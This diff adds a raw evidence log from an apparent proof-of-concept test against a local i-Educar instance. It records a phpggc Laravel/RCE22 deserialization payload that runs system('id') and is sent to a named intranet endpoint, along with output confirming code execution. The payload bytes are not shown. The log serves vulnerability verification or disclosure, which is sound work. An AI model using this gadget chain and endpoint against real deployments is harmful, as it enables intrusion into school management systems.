@@ -1,0 +1,25 @@
+# i-explorar raw evidence
+# started_at: 2026-09-11T00:17:24.239334+00:00
+# host: -03
+# target: http://127.0.0.1:8080
+# payload: 772 bytes (phpggc Laravel/RCE22, system('id > /tmp/poc08marker'))
+
+### POST /intranet/educar_quadro_horario_horarios_cad.php
+HTTP 200
+
+--- body head ---
+<!DOCTYPE html>
+<html lang="pt" class="no-js">
+<head>
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <meta http-equiv='Content-Type' content='text/html; charset=UTF-8'>
+    <meta http-equiv="Pragma" content="no-cache">
+    <meta http-equiv="Expires" content="-1">
+    
+--- end body head ---
+$ docker compose exec -T fpm cat /tmp/poc08marker
+
+--- marker output ---
+uid=1000(ieducar) gid=1000(ieducar) groups=1000(ieducar),1000(ieducar)
+--- end marker output ---
+# finished_at: 2026-09-11T00:17:25.028601+00:00
